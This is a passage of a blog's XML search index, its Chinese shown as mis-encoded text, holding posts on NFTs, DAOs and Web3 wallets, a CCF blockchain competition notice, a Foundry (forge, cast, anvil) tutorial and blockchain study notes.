éƒ½æ˜¯ä¸å¯æ›¿ä»£çš„ï¼Œå…¶å›ºæœ‰çš„ç¨€ç¼ºæ€§æˆä¸ºå…¶é‡è¦çš„ä»·å€¼æ¥æºã€‚è¿™ç§ç¨€ç¼ºæ€§ï¼Œå°¤å…¶æ˜¯å¯¹äºç‹¬ç‰¹çš„è‰ºæœ¯å“è€Œè¨€ï¼Œèµ‹äºˆäº† NFT æé«˜çš„æ”¶è—ä»·å€¼ã€‚</li><li>æ­¤å¤–ï¼Œå°½ç®¡ NFT ä¸å¯æ›¿ä»£ï¼Œä½†å®ƒä»¬ä»å¯ä»¥åœ¨å…¨çƒå¤šä¸ªå¹³å°ä¸Šä¹°å–å’Œäº¤æ˜“ï¼Œä»è€Œä¸ºå…¶æä¾›æµåŠ¨æ€§ã€‚éšç€å¸‚åœºçš„ä¸æ–­å¢é•¿ï¼Œè¿™ç§æµåŠ¨æ€§æ­£åœ¨ç¨³æ­¥å¢åŠ ã€‚</li><li>æœ€åï¼Œä¸€äº› NFT é¡¹ç›®å…è®¸æŒæœ‰è€…å¯¹é¡¹ç›®çš„å‘å±•è¿›è¡ŒæŠ•ç¥¨æˆ–æä¾›ç¤¾åŒºç‰¹å®šçš„ç¦åˆ©ã€‚è¿™å¢å¼ºäº†ç”¨æˆ·ä½“éªŒï¼Œä½¿ NFT ä¸ä»…ä»…æ˜¯ä¸€ç§æ”¶è—å“ï¼Œè€Œæ˜¯ä¸€ä¸ªæ‹¥æœ‰ç¤¾åŒºå’Œç”Ÿæ€ç³»ç»Ÿçš„æ´»è·ƒé¡¹ç›®ã€‚</li></ul><h3 id="DAO"><a href="#DAO" class="headerlink" title="DAO"></a>DAO</h3><p>ä¸€ä¸ªå»ä¸­å¿ƒåŒ–è‡ªæ²»ç»„ç»‡ï¼ˆDAOï¼‰æ˜¯åŸºäºåŒºå—é“¾æŠ€æœ¯çš„ç»„ç»‡å½¢å¼ï¼Œé€šè¿‡æ™ºèƒ½åˆçº¦è‡ªåŠ¨æ‰§è¡Œç»„ç»‡çš„è§„åˆ™å’Œå†³ç­–ã€‚ä¸ä¼ ç»Ÿå…¬å¸ä¸åŒï¼ŒDAO ç¼ºä¹ç®¡ç†å±‚å’Œä¸­å¤®æƒå¨ï¼›æ‰€æœ‰å†³ç­–éƒ½é€šè¿‡æˆå‘˜æŠ•ç¥¨æˆ–é¢„å®šç®—æ³•åšå‡ºã€‚æˆå‘˜é€šå¸¸æŒæœ‰èµ‹äºˆä»–ä»¬æŠ•ç¥¨æƒçš„ä»£å¸ï¼Œä½¿ä»–ä»¬èƒ½å¤Ÿç›´æ¥å‚ä¸ç»„ç»‡çš„æ²»ç†ï¼Œä¾‹å¦‚æå‡ºææ¡ˆã€å†³å®šé¡¹ç›®æ–¹å‘å’Œåˆ†é…èµ„é‡‘ã€‚</p><p>ä¸ä¼ ç»Ÿå…¬å¸ç›¸æ¯”ï¼ŒDAO åœ¨é€æ˜åº¦ã€ä¿¡ä»»è¦æ±‚ã€è¿è¥æ•ˆç‡ã€å‚ä¸å¼æ°‘ä¸»å’Œå®‰å…¨æ€§æ–¹é¢å…·æœ‰æ˜¾è‘—ä¼˜åŠ¿ã€‚</p><ul><li>é¦–å…ˆï¼ŒDAO å†…çš„æ‰€æœ‰å†³ç­–è¿‡ç¨‹å’Œé‡‘èäº¤æ˜“éƒ½å…¬å¼€è®°å½•åœ¨åŒºå—é“¾ä¸Šï¼Œä»»ä½•å¤–éƒ¨å®¡è®¡å¸ˆéƒ½å¯ä»¥è½»æ¾éªŒè¯ï¼Œä»è€Œæé«˜äº†ç»„ç»‡çš„é€æ˜åº¦ã€‚</li><li>å…¶æ¬¡ï¼ŒDAO å†…éƒ¨æˆå‘˜ä¹‹é—´çš„äº¤äº’æ˜¯é€šè¿‡ä»£ç æ¥å®ç°çš„ï¼Œæˆå‘˜â€‹â€‹åªéœ€è¦ä¿¡ä»»æ™ºèƒ½åˆçº¦ä»£ç æœ¬èº«ï¼Œè€Œä¸éœ€è¦åƒä¼ ç»Ÿå…¬å¸é‚£æ ·ä¿¡ä»»ä¸ªåˆ«é¢†å¯¼æˆ–è€…ä¸€ä¸ªä¸­å¿ƒåŒ–çš„å›¢é˜Ÿã€‚</li><li>æ­¤å¤–ï¼Œç”±äºæ™ºèƒ½åˆçº¦å¯ä»¥è‡ªåŠ¨æ‰§è¡Œä»»åŠ¡ï¼Œè¿™å‡å°‘äº†æ‰‹åŠ¨å¤„ç†çš„éœ€è¦ï¼Œæ¶ˆé™¤äº†è®¸å¤šä¸å¿…è¦çš„ä¸­ä»‹ï¼Œå¹¶æé«˜äº†ç»„ç»‡è¿è¥çš„æ•ˆç‡ã€‚</li><li>æ­¤å¤–ï¼ŒDAO å…è®¸æ¯ä¸ªæŒæœ‰ä»£å¸çš„æˆå‘˜å‚ä¸å†³ç­–ï¼Œä¿ƒè¿›æ›´åŠ æ°‘ä¸»çš„å†³ç­–è¿‡ç¨‹ï¼Œå¹¶ç¡®ä¿ç»„ç»‡çœŸæ­£ç”±ç¤¾åŒºæˆå‘˜é©±åŠ¨ã€‚</li><li>æœ€åï¼ŒåŒºå—é“¾æŠ€æœ¯çš„ä½¿ç”¨å¢å¼ºäº† DAO çš„å®‰å…¨æ€§ï¼Œå› ä¸ºå®ƒä¾é åŠ å¯†å’Œå…±è¯†ç®—æ³•æ¥ä¿æŠ¤æ•°æ®å’Œèµ„äº§ï¼Œä»è€Œåœ¨å¾ˆå¤§ç¨‹åº¦ä¸Šé˜²æ­¢å¤–éƒ¨æ”»å‡»å’Œå†…éƒ¨æ»¥ç”¨ã€‚</li></ul><h3 id="Web3é’±åŒ…"><a href="#Web3é’±åŒ…" class="headerlink" title="Web3é’±åŒ…"></a>Web3é’±åŒ…</h3><p>Web3 é’±åŒ…æ˜¯ä¸€ç§ä¸“ä¸ºä¸ Web3 æŠ€æœ¯ï¼ˆå»ä¸­å¿ƒåŒ–ç½‘ç»œï¼‰é›†æˆè€Œè®¾è®¡çš„æ•°å­—è´§å¸é’±åŒ…ã€‚ä¸ä¼ ç»Ÿæ•°å­—è´§å¸é’±åŒ…ä¸åŒï¼ŒWeb3 é’±åŒ…å…è®¸ç”¨æˆ·ä¸å»ä¸­å¿ƒåŒ–åº”ç”¨ç¨‹åº (DApp) äº¤äº’ã€ç­¾ç½²äº¤æ˜“å¹¶ç®¡ç†å…¶åŠ å¯†èµ„äº§ï¼Œè€Œæ— éœ€ä¾èµ–ä¸­å¿ƒåŒ–ç¬¬ä¸‰æ–¹ã€‚è¿™äº›é’±åŒ…é€šå¸¸æ”¯æŒå¤šç§åŠ å¯†è´§å¸ï¼Œå¹¶æä¾›å®‰å…¨çš„ç§é’¥ç®¡ç†åŠŸèƒ½ï¼Œä»¥ç¡®ä¿ç”¨æˆ·èµ„é‡‘çš„å®‰å…¨ã€‚</p><p>åœ¨ Web3 ä¸–ç•Œä¸­ï¼Œä¸€äº›æµè¡Œçš„é’±åŒ…åº”ç”¨ç¨‹åºå› å…¶å®‰å…¨æ€§ã€æ˜“ç”¨æ€§å’ŒåŠŸèƒ½æ€§è€Œè„±é¢–è€Œå‡ºï¼Œæˆä¸ºç”¨æˆ·çš„é¦–é€‰ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›æµè¡Œçš„ Web3 é’±åŒ…ï¼š</p><ul><li>MetaMaskï¼šMetaMask æ˜¯æœ€è‘—åçš„ä»¥å¤ªåŠé’±åŒ…ä¹‹ä¸€ã€‚å®ƒæ˜¯ä¸€ä¸ªæµè§ˆå™¨æ‰©å±•å’Œç§»åŠ¨åº”ç”¨ç¨‹åºï¼Œå…è®¸ç”¨æˆ·åœ¨ç½‘ç»œæµè§ˆå™¨ä¸­è½»æ¾è®¿é—®ä»¥å¤ªåŠ DApp å¹¶ç®¡ç†å…¶åŠ å¯†èµ„äº§ã€‚</li><li>Trust Walletï¼šTrust Wallet æ˜¯ä¸€æ¬¾å®‰å…¨çš„ç§»åŠ¨é’±åŒ…åº”ç”¨ç¨‹åºï¼Œæ”¯æŒå¤šç§åŠ å¯†è´§å¸ï¼ŒåŒ…æ‹¬ä»¥å¤ªåŠå’Œæ¯”ç‰¹å¸ã€‚å®ƒæä¾›äº†ç”¨æˆ·å‹å¥½çš„ç•Œé¢ï¼Œå¹¶æ”¯æŒä¸ DeFi åº”ç”¨ç¨‹åºé›†æˆã€‚</li><li>Coinbase é’±åŒ…ï¼šCoinbase é’±åŒ…æ˜¯åŠ å¯†è´§å¸äº¤æ˜“å¹³å° Coinbase æ¨å‡ºçš„ä¸€æ¬¾é’±åŒ…åº”ç”¨ï¼Œæ”¯æŒä»¥å¤ªåŠå’Œ ERC-20 ä»£å¸ï¼Œå†…ç½® DApp æµè§ˆå™¨ã€‚</li><li>å¸å®‰é“¾é’±åŒ…ï¼šå¸å®‰é“¾é’±åŒ…æ˜¯åŠ å¯†è´§å¸äº¤æ˜“å¹³å°å¸å®‰æ¨å‡ºçš„é’±åŒ…åº”ç”¨ï¼Œæ—¨åœ¨å…¼å®¹å¸å®‰æ™ºèƒ½é“¾ï¼ˆBSCï¼‰å¹¶æ”¯æŒå¤šç§åŠ å¯†è´§å¸å’ŒDAppã€‚</li><li>Trezorï¼šTrezor æ˜¯ä¸€æ¬¾ä»¥é«˜å®‰å…¨æ€§å’Œä¾¿æºæ€§è‘—ç§°çš„ç¡¬ä»¶é’±åŒ…ã€‚å®ƒæ”¯æŒå¤šç§åŠ å¯†è´§å¸ï¼ŒåŒ…æ‹¬æ¯”ç‰¹å¸å’Œä»¥å¤ªåŠï¼Œæ˜¯å®‰å…¨å­˜å‚¨åŠ å¯†èµ„äº§çš„ç†æƒ³é€‰æ‹©ã€‚</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> åŸºç¡€çŸ¥è¯† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CCFåŒºå—é“¾æŠ€æœ¯ä¸åº”ç”¨åˆ›æ–°ç«èµ›</title>
      <link href="/2024/09/25/CCF%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%BA%94%E7%94%A8%E5%88%9B%E6%96%B0%E7%AB%9E%E8%B5%9B/"/>
      <url>/2024/09/25/CCF%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%BA%94%E7%94%A8%E5%88%9B%E6%96%B0%E7%AB%9E%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h3 id="å‚èµ›é˜Ÿä¼æœ€å¤š4äººï¼Œéœ€è¦ä¸€åæŒ‡å¯¼è€å¸ˆ"><a href="#å‚èµ›é˜Ÿä¼æœ€å¤š4äººï¼Œéœ€è¦ä¸€åæŒ‡å¯¼è€å¸ˆ" class="headerlink" title="å‚èµ›é˜Ÿä¼æœ€å¤š4äººï¼Œéœ€è¦ä¸€åæŒ‡å¯¼è€å¸ˆ"></a>å‚èµ›é˜Ÿä¼æœ€å¤š4äººï¼Œéœ€è¦ä¸€åæŒ‡å¯¼è€å¸ˆ</h3><h3 id="æŠ¥åæ—¶é—´ï¼šæˆªæ­¢åˆ°2024å¹´9æœˆ30å·"><a href="#æŠ¥åæ—¶é—´ï¼šæˆªæ­¢åˆ°2024å¹´9æœˆ30å·" class="headerlink" title="æŠ¥åæ—¶é—´ï¼šæˆªæ­¢åˆ°2024å¹´9æœˆ30å·"></a>æŠ¥åæ—¶é—´ï¼šæˆªæ­¢åˆ°2024å¹´9æœˆ30å·</h3><h3 id="æäº¤ä½œå“ï¼šæˆªæ­¢åˆ°2023å¹´10æœˆ31å·-ç½‘å€https-btc-ccf-org-cn"><a href="#æäº¤ä½œå“ï¼šæˆªæ­¢åˆ°2023å¹´10æœˆ31å·-ç½‘å€https-btc-ccf-org-cn" class="headerlink" title="æäº¤ä½œå“ï¼šæˆªæ­¢åˆ°2023å¹´10æœˆ31å· ç½‘å€https://btc.ccf.org.cn"></a>æäº¤ä½œå“ï¼šæˆªæ­¢åˆ°2023å¹´10æœˆ31å· ç½‘å€<a href="https://btc.ccf.org.cn/">https://btc.ccf.org.cn</a></h3>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>foundryçš„ä½¿ç”¨å’Œå®‰è£…</title>
      <link href="/2024/09/22/foundry%E7%9A%84%E4%BD%BF%E7%94%A8%E5%92%8C%E5%AE%89%E8%A3%85/"/>
      <url>/2024/09/22/foundry%E7%9A%84%E4%BD%BF%E7%94%A8%E5%92%8C%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<h2 id="å¼•è¨€"><a href="#å¼•è¨€" class="headerlink" title="å¼•è¨€"></a>å¼•è¨€</h2><p>ä¸Šæ¬¡é‚£ä¸ª<a href="https://updraft.cyfrin.io/">ç½‘ç«™</a>,é‡Œé¢æœ‰è®²foundryï¼Œè™½ç„¶ä»¥å‰å­¦ä¹ è¿‡ï¼Œä½†æ˜¯è¿˜æ˜¯æ²¡èƒ½å…·ä½“å­¦ä¹ è¿‡ï¼Œåªä¼šä¸€äº›æµ‹è¯•çš„ç”¨æ³•ï¼Œå…¶ä»–é«˜æ·±çš„ç”¨æ³•è¿˜æ²¡æœ‰äº†è§£åˆ°ï¼Œå€Ÿæ­¤æœºä¼šå†æ¬¡å­¦ä¹ ä¸€ä¸‹ï¼Œå°±å†™äº†è¿™ä¸ªç¬”è®°</p><h2 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><p>æ¨èè¿™ä¸ªç½‘ç«™<a href="https://book.getfoundry.sh/">Foundry-Book</a>;<br>å®‰è£…å®Œæˆåï¼Œåœ¨ç»ˆç«¯ä½¿ç”¨æŒ‡ä»¤ï¼šForge â€“version æŸ¥çœ‹æœ‰æ²¡æœ‰å®‰è£…å¥½ï¼Œå¦‚æœæ²¡æœ‰ï¼Œå°±åˆ é™¤ä»å¤´å†æ¥ä¸€é</p><p>æˆ‘ä»¬ä½¿ç”¨çš„æ˜¯windowsçš„ç³»ç»Ÿå°±è¦å»æ‰¾å±äºwindowå®‰è£…æ•™ç¨‹ï¼ˆæˆ‘å°±åå¤å®‰è£…ï¼Œåƒäº†å¾ˆå¤šäºï¼‰ï¼Œå¦‚æœä½ æƒ³ä½¿ç”¨windowsä¸Šçš„å­ç³»ç»ŸLinux,å°±å¯ä»¥åœ¨ä½ çš„ç»ˆç«¯ä½¿ç”¨ wsl â€“install ,ç„¶åé‡å¯å®‰è£…å³å¯</p><h2 id="ä½¿ç”¨-ï¼ˆforge-ï¼‰"><a href="#ä½¿ç”¨-ï¼ˆforge-ï¼‰" class="headerlink" title="ä½¿ç”¨ ï¼ˆforge ï¼‰"></a>ä½¿ç”¨ ï¼ˆforge ï¼‰</h2><p>æœ€å¼€å§‹æˆ‘è¿˜æ²¡æœ‰äº†è§£åˆ°æ€ä¹ˆè‡ªå·±ç”¨Foundryå…¨æ˜¯ä»ä»“åº“ git clone ä¸‹æ¥ï¼Œå®ƒè‡ªå¸¦Foundry,å°±ä¸éœ€è¦è‡ªå·±æ„å»ºæ–‡ä»¶å¤¹ã€‚ç°åœ¨å°±ä»‹ç»ä¸€ä¸‹æ€ä¹ˆæ„å»ºä¸€ä¸ªæ–‡ä»¶å¤¹åŒ…å«Foundryæµ‹è¯•æ¡†æ¶ã€‚ï¼ˆæ³¨æ„æˆ‘ä»¬ä½¿ç”¨çš„æ˜¯VSCODEè¿™ä¸ªè½¯ä»¶ï¼Œéå¸¸å¥½ç”¨ï¼‰</p><ul><li>é¦–å…ˆåˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œåœ¨git baseç»ˆç«¯ä¸Šè¾“å…¥ forge init æ–‡ä»¶å¤¹åå­—</li><li>è¿›å…¥æ–‡ä»¶å¤¹ cd æ–‡ä»¶å¤¹åå­— </li><li>å†æ„å»ºé¡¹ç›® forge build æˆ–åˆ™ forge compile</li><li>æµ‹è¯•æ—¶ä½¿ç”¨ forge test å¦‚æœè¦æµ‹è¯•ï¼Œæµ‹è¯•åˆçº¦ä¸­çš„ä¸€ä¸ªæµ‹è¯•å‡½æ•°ï¼Œæ˜¯å¯ä»¥ä½¿ç”¨è¿‡æ»¤æ¡ä»¶æ–¹æ³•ï¼šforge test â€“match-contract æµ‹è¯•åˆçº¦å â€“match-test æµ‹è¯•å‡½æ•°,ä¹Ÿå¯ä»¥ä½¿ç”¨è·¯å¾„æµ‹è¯•$ forge test â€“match-path test&#x2F;ContractB.t.sol</li></ul><h2 id="cast"><a href="#cast" class="headerlink" title="cast"></a>cast</h2><p>ä¸€äº›Castçš„æŒ‡ä»¤ï¼š</p><ul><li>è·å–å½“å‰é“¾çš„IDï¼šcast chain-id</li><li>è·å–å½“å‰å®¢æˆ·ç«¯ç‰ˆæœ¬ï¼šcast client</li><li>è·å–å½“å‰gasä»·æ ¼ï¼šcast gas-price</li><li>æŸ¥è¯¢æœ€æ–°çš„åŒºå—å·ï¼šcast block-number</li><li>è·å–å½“å‰çš„ç½‘ç»œåŸºç¡€è´¹ï¼šcast basefee</li><li>è·å–blockçš„è¯¦ç»†ä¿¡æ¯ï¼šcast block</li><li>è·å–åŒºå—çš„æ—¶é—´æˆ³ä¿¡æ¯ï¼šcast age</li><li>æŸ¥è¯¢ç‰¹å®šçš„ä»¥å¤ªåŠè´¦æˆ·åœ°å€ï¼šcast balance åœ°å€   å¦‚æœä¸çŸ¥é“åœ°å€ï¼Œå°±ä½¿ç”¨ENSæŸ¥è¯¢ï¼šcast balance vitalik.eth</li><li>æŸ¥çœ‹æºä»£ç ï¼šcast etherscan-source åœ°å€</li></ul><h2 id="anvil"><a href="#anvil" class="headerlink" title="anvil"></a>anvil</h2><p>å®ƒå¯ä»¥æä¾›ä¸€ä¸ªæ–¹ä¾¿æµ‹è¯•å’Œå¼€å‘çš„ä»¥å¤ªåŠèŠ‚ç‚¹<br>ä½¿ç”¨anvilæŒ‡ä»¤ï¼Œå®ƒå¯ä»¥è¾“å‡ºè´¦æˆ·ï¼Œç§é’¥ï¼Œé“¾IDï¼ŒåŸºæœ¬è´¹ç”¨ç­‰<br>é€šè¿‡ä½¿ç”¨anvil-h,å¯ä»¥æŸ¥çœ‹anvilæ‰€æœ‰çš„é…ç½®é€‰é¡¹<br>ä½¿ç”¨anvil -a æ•°é‡ï¼Œå¯ä»¥ç”ŸæˆæŒ‡å®šçš„æ•°é‡å¼€å‘è´¦æˆ·</p><h2 id="Chisel"><a href="#Chisel" class="headerlink" title="Chisel"></a>Chisel</h2><p>Chiselæ˜¯ä¸€ä¸ªSolidity REPL,ç”¨äºç¼–å†™å’Œæµ‹è¯•Solidityä»£ç ç‰‡æ®µï¼Œå®ƒæä¾›äº†ä¸€ä¸ªç”¨äºç¼–ç¨‹å’Œæ‰§è¡ŒASolidityä»£ç çš„äº¤äº’å¼ç¯å¢ƒ</p><h2 id="Forge-Std"><a href="#Forge-Std" class="headerlink" title="Forge Std"></a>Forge Std</h2><p>å®ƒæ˜¯Forgeæ ‡å‡†åº“ï¼Œä¸ºFoundryæ¡†æ¶æä¾›äº†ä¸°å¯Œçš„è¾…ç»„åˆçº¦ï¼Œç®€åŒ–å’ŒåŠ é€Ÿç¼–å†™æ™ºèƒ½åˆçº¦æµ‹è¯•çš„è¿‡ç¨‹å¹¶æå‡ç”¨æˆ·ä½“éªŒ<br>ä½¿ç”¨Forge Std åªéœ€è¦åœ¨æµ‹è¯•åˆçº¦å¯¼å…¥Test.solå¹¶ç»§æ‰¿Test</p><p>æ ¸å¿ƒåŠŸèƒ½ï¼š<br>è®¿é—®Hevm:é€šè¿‡vmå®ä¾‹ç›´æ¥ä½¿ç”¨ï¼Œcheatcodeæ¨¡æ‹Ÿå„ç§åŒºå—é“¾çŠ¶æ€å’Œè¡Œä¸º</p><blockquote><p>Hevmæ˜¯DappHubå›¢é˜Ÿå¼€å‘çš„ä»¥å¤ªåŠè™šæ‹Ÿæœºå®ç°ï¼Œä¸“é—¨ç”¨äºæµ‹è¯•å’Œè°ƒè¯•æ™ºèƒ½åˆçº¦ï¼Œå®ƒæ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œå¯ä»¥æ¨¡æ‹Ÿä»¥å¤ªåŠç½‘ç»œçš„è¡Œä¸ºï¼Œå…è®¸å¼€å‘äººå‘˜åœ¨æœ¬åœ°æ‰§è¡Œæµ‹è¯•å’Œè°ƒè¯•å®ƒä»¬çš„åˆçº¦ï¼Œè€Œæ— éœ€è¿æ¥åˆ°å®é™…çš„ä»¥å¤ªåŠç½‘ç»œ<br>æ–­è¨€å’Œæ—¥å¿—ï¼šä»Dappsys Test ç»§æ‰¿ï¼Œå…·æœ‰æ–­è¨€åŠŸèƒ½å’Œä¸€Hardhatä¸ºé£æ ¼çš„æ—¥å¿—è®°å½•<br>æ ‡å‡†åº“åŠŸèƒ½ï¼šForge Std æä¾›çš„æ ‡å‡†åº“åŒ…æ‹¬å„ç§å®ç”¨çš„å·¥å…·å’ŒåŠŸèƒ½ï¼Œä¾‹å¦‚ï¼Œå‘æŒ‡å®šè´¦æˆ·å‘é€ä»£å¸</p></blockquote><p>åœ¨Forgeæ ‡å‡†åº“çš„æµ‹è¯•åˆçº¦ä¸­ï¼Œé€šè¿‡vmå®ä¾‹å¯ä»¥æ–¹ä¾¿çš„è®¿é—®ä½œå¼Šç <br>ä¾‹å¦‚ï¼šèº«ä»½è½¬åŒ–ï¼švm.prank;ä½¿ç”¨vm.prank()å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥æš‚æ—¶åˆ‡æ¢è°ƒç”¨è€…çš„èº«ä»½</p><h2 id="ç¼–å†™æµ‹è¯•åˆçº¦"><a href="#ç¼–å†™æµ‹è¯•åˆçº¦" class="headerlink" title="ç¼–å†™æµ‹è¯•åˆçº¦"></a>ç¼–å†™æµ‹è¯•åˆçº¦</h2><p>å¿…è¦å·¥ä½œï¼Œå¯¼å…¥ï¼šimport â€œforge-std&#x2F;Test.solâ€<br>setUPå‡½æ•°ï¼Œæ˜¯ä¸€ä¸ªå¯é€‰å‡½æ•°ï¼Œåœ¨è¿è¡Œæµ‹è¯•ç”¨ä¾‹ä¹‹å‰è°ƒç”¨ï¼Œç”¨äºåˆå§‹åŒ–æµ‹è¯•ç¯å¢ƒ<br>ä»¥testä¸ºå‰ç¼€çš„å‡½æ•°å°†è¢«è¯†åˆ«ä¸ºæµ‹è¯•ç”¨ä¾‹å¹¶æ‰§è¡Œ<br>testFailå‡½æ•°ï¼Œç”¨äºæŒ‡ç¤ºé¢„æœŸçš„æµ‹è¯•å¤±è´¥ï¼Œå¦‚æœæ­¤å‡½æ•°æœªè§¦å‘è¿˜åŸï¼Œåˆ™æµ‹è¯•å¤±è´¥</p><p>è¿˜æœ‰ä¸€äº›é«˜çº§çš„æµ‹è¯•æŠ€æœ¯ï¼šexpectRevertï¼šå®ƒæ˜¯è¿›è¡Œç²¾å‡†çš„é”™è¯¯å¤„ç†ï¼Œä¾‹å¦‚,vm.expectRevert(Some.Error.selector) &#x2F;&#x2F;å¯è§¦å‘SomeErrorä¸€äº›é”™è¯¯</p><p>å…±äº«è®¾ç½®ï¼šé€šè¿‡åˆ›å»ºæŠ½è±¡åˆçº¦å¹¶åœ¨æµ‹è¯•åˆçº¦ä¸­ç»§æ‰¿å®ƒï¼Œå¯ä»¥è®¾ç½®å…±äº«ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abstract contract SetupHelper &#123;</span><br><span class="line">    // Shared setup codes</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract MyTest is Test, SetupHelper &#123;</span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        // Shared setup</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡å…±äº«è®¾ç½®å¯ä»¥é¿å…åœ¨æ¯ä¸ªæµ‹è¯•åˆçº¦ä¸­é‡å¤ç›¸åŒçš„åˆå§‹åŒ–ä»£ç ï¼Œæé«˜ä»£ç çš„å¯é‡ç”¨æ€§å’Œå¯ç»´æŠ¤æ€§</p><p>å¯¼å…¥æ–‡ä»¶ï¼Œç”¨<br>import â€œforge-std&#x2F;Test.solâ€<br>è¿™ä¸ªæ˜¯å¿…è¦çš„</p>]]></content>
      
      
      
        <tags>
            
            <tag> test </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åŒºå—é“¾çŸ¥è¯†å·©å›º</title>
      <link href="/2024/09/20/%E5%8C%BA%E5%9D%97%E9%93%BE%E7%9F%A5%E8%AF%86%E5%B7%A9%E5%9B%BA/"/>
      <url>/2024/09/20/%E5%8C%BA%E5%9D%97%E9%93%BE%E7%9F%A5%E8%AF%86%E5%B7%A9%E5%9B%BA/</url>
      
        <content type="html"><![CDATA[<p>æœ€è¿‘åˆ«äººåˆ†äº«äº†ä¸€ä¸ªç½‘ç«™ï¼Œå¯¹äºä¸€äº›çŸ¥è¯†å·©å›ºæˆ‘è§‰å¾—æŒºå¥½çš„</p><p>ç½‘ç«™é“¾æ¥æˆ‘å°±æ”¾åœ¨<a href="https://updraft.cyfrin.io/">è¿™é‡Œ</a></p><p>å­¦ä¹ è¿™ä¸ªç½‘ç«™ï¼Œæˆ‘å°±åœ¨è¿™ä¸ªåšå®¢ä¸Šåˆ†äº«ä¸€äº›æˆ‘çš„ç¬”è®°</p><h2 id="ä¸€ï¼ŒåŸºæœ¬å¸¸è¯†"><a href="#ä¸€ï¼ŒåŸºæœ¬å¸¸è¯†" class="headerlink" title="ä¸€ï¼ŒåŸºæœ¬å¸¸è¯†"></a>ä¸€ï¼ŒåŸºæœ¬å¸¸è¯†</h2><p>1ï¼ŒOracle: å°±æ˜¯å……å½“åŒºå—é“¾ä¸å¤–éƒ¨ä¸–ç•Œè”ç³»çš„ä¸­ä»‹ï¼Œå…è®¸æ™ºèƒ½åˆçº¦ä¸çœŸå®ä¸–ç•Œäº¤äº’æ•°æ®<br>2ï¼ŒLayer2: å®ƒæ˜¯æ„å»ºåœ¨Laryer1ä¹‹ä¸Šçš„æŠ€æœ¯ï¼Œå®ƒå¯ä»¥æé«˜åŒºå—é“¾äº¤æ˜“çš„æ‰©å±•æ€§å’Œæ•ˆç‡ï¼Œå®ƒé€šå¸¸åœ¨äº¤æ˜“ä¹‹å¤–æ‰§è¡Œï¼Œå°±æ˜¯ä¸ºäº†é¿å…äº¤æ˜“æ‹¥æŒ¤å’Œä¸€äº›è´¹ç”¨äº§ç”Ÿï¼Œå¦‚æ¯”ç‰¹å¸é—ªç”µç½‘ç»œ<br>3ï¼ŒDAPPï¼šå»ä¸­å¿ƒåŒ–çš„åº”ç”¨ï¼Œé€šå¸¸åœ¨åŒºå—é“¾ä¸Šè¿è¡Œï¼Œå°±ç±»æ¯”æˆ‘ä»¬ç°å®ç”Ÿæ´»ä¸­çš„appï¼Œå°±æ˜¯åº”ç”¨<br>4ï¼Œæ™ºèƒ½åˆçº¦ï¼šå®ƒä½¿è‡ªåŠ¨æ‰§è¡Œçš„åˆçº¦ï¼Œåœ¨åŒºå—é“¾ä¸Šè¿è¡Œ<br>5,web3: å®ƒæ˜¯ä¸€ä¸ªæœªè·è®¸å¯ä¾èµ–äºå»ä¸­å¿ƒåŒ–çš„ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªæœ¯è¯­ï¼Œå®ƒå¼€åˆ›äº†ä¸€ä¸ªæŠ—å®¡æŸ¥å’Œé€æ˜åè®®å’Œäº¤æ˜“çš„ä¸€ä¸ªé¢†åŸŸ<br>6ï¼ŒChainlink: å®ƒä¸åŒºå—é“¾ä¸Šçš„é¢„è¨€æœºï¼Œå®ƒé€šè¿‡é“¾ä¸Šçš„é€»è¾‘å’Œé“¾ä¸‹çš„æ•°æ®å’Œè®¡ç®—ï¼Œç¡®ä¿è¿™ä¸ªé€»è¾‘å’Œè¿™ä¸ªæ•°æ®ä¿æŒå»ä¸­å¿ƒåŒ–<br>7ï¼Œä¸€ä¸ªåŒºå—åŒ…æ‹¬ï¼ŒåŒºå—å¤´ï¼ŒåŒºå—ä½“</p><blockquote><p>åŒºå—å¤´ï¼šnonce(äº¤æ˜“çš„è®¡æ•°),å‰ä¸€ä¸ªå“ˆå¸Œå€¼ï¼ˆæ³¨æ„ï¼šåˆ›ä¸–åŒºå—æ²¡æœ‰çˆ¶å“ˆå¸Œå€¼ï¼‰æ—¶é—´æˆ³ï¼Œä¸‰ä¸ªæ ‘æ ¹ï¼ˆçŠ¶æ€æ ‘æ ¹ï¼šè®°å½•æ‰€æœ‰è´¦æˆ·çš„ä½™é¢ï¼Œä¿¡æ¯ç­‰ï¼Œäº¤æ˜“æ ‘æ ¹ï¼Œæ”¶æ®æ ‘æ ¹ï¼Œå¸åŸºï¼ˆè¯†åˆ«çŸ¿å·¥çš„åœ°å€ï¼‰ï¼Œéš¾åº¦ç›®æ 